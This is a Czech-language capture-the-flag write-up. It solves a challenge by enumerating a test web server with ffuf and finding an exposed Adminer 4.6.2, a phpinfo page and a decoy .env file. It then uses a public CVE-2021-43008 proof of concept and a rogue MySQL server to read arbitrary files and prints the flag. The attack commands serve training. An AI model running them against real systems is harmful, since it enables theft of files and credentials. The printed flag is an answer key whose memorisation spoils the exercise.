# Experimental Server (4)

## Zadání

Hi Senior Researcher,

a group of researchers is preparing a new server for their upcoming project. It is not in production yet, so following the usual convention, the machine has been given an experimental hostname (such as `x-<service><year>-<index_in_year>`).

Everything seems routine — until the network monitoring team notices something unusual: the server is making suspicious outbound TCP connections to port 3306. Its admins are attending an IEEE event and cannot be disturbed, so it is up to you to find out what is going on.

Stay curious!

The server sits on `x-www26-2.nren.tcc`

## Nápovědy (Hints)

1. All services in `nren.tcc domain` are accessible via VPN only.
2. Reconnaissance is about more than finding things — explore, collect the pieces, and connect the dots.

## Řešení

Po otevření stránky <http://x-www26-2.nren.tcc/> se dozvíme jen, že

`Our new website is under construction. We'll be back soon.`

Začneme klasicky skenem

`ffuf -u http://x-www26-2.nren.tcc/FUZZ -w /usr/share/dirb/wordlists/big.txt -e .html,.php`

```text
adminer.php             [Status: 200, Size: 4225, Words: 184, Lines: 52, Duration: 51ms]
assets                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 26ms]
backup                  [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 19ms]
i.php                   [Status: 200, Size: 73831, Words: 3621, Lines: 822, Duration: 35ms]
index.html              [Status: 200, Size: 336, Words: 35, Lines: 15, Duration: 16ms]
```

`adminer.php` je SW pro web administraci databáze. V uloze je verze 4.6.2

`backup` vrací HTTP kód 403, takže asi existuje, ale je nedostupný.

`i.php` je jen přejmenovaný `phpinfo.php` a obsahuje důležitou informaci o konfiguraci `mysqli.allow_local_infile = On`

Dalším průzkumem jsem ještě objevil soubor `.env`

```text
APP_NAME="Adminer Corp"
APP_ENV=production
APP_DEBUG=false
APP_URL=https://adminer-corp.ctf

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=adminer_prod
DB_USERNAME=svc_dbadmin
DB_PASSWORD=Xk7$pQ2m-NvR8wL!t

FLAG=flag.txt

REDIS_HOST=127.0.0.1
REDIS_PORT=6379
REDIS_PASSWORD=r3d1s_Qz9_LpW2sH

MAIL_MAILER=smtp
MAIL_HOST=smtp.adminer-corp.ctf
MAIL_USERNAME=noreply@adminer-corp.ctf
MAIL_PASSWORD=Sm7pR3lay_9xQ2vB

APP_KEY=base64:n7Hf2Qp9Lm4Rt6Yw8Zx1Vc3Bn5Mk0Jd2Gh4Fs6Aq8=
JWT_SECRET=eyJ0aGlzIjoiaXMgbm90IHJlYWwiLCJqdXN0IjoiZGVjb3kifQ
```

Dekódovaný JWT_SECRET obsahuje

```json
{"this":"is not real","just":"decoy"}
```

To naznačuje, že informace v tomto souboru jsou slepá cesta. Přihlašovací údaje k databázi v Admineru opravdu nefungují.

Adminer ve verzi 4.6.2 obsahuje závažnou chybu CVE-2021-43008.
K tomu lze dohledat PoC <https://github.com/p0dalirius/CVE-2021-43008-AdminerRead>.

Repozitář obsahuje i Dockerfile s nastaveným lokálním mysql serverem, přes který bude probíhat přenos souborů.

`python AdminerRead.py -I 10.200.0.40 -t http://x-www26-2.nren.tcc/adminer.php -F wordlists/all`

V přenesených souborech flag není, ale z informací, které máme, poskládáme pravděpodobnou cestu k souboru s flagem.

Už víme

* z i.php `DOCUMENT_ROOT = /var/www/public`
* z ffuf adresář `backup`
* z .env `FLAG = flag.txt`

`python AdminerRead.py -I 10.200.0.40 -t http://x-www26-2.nren.tcc/adminer.php -f /var/www/public/backup/flag.txt`

Bingo, máme flag.

## Flag

`FLAG{u2G3-dsoj-nLGS-M9xh}`
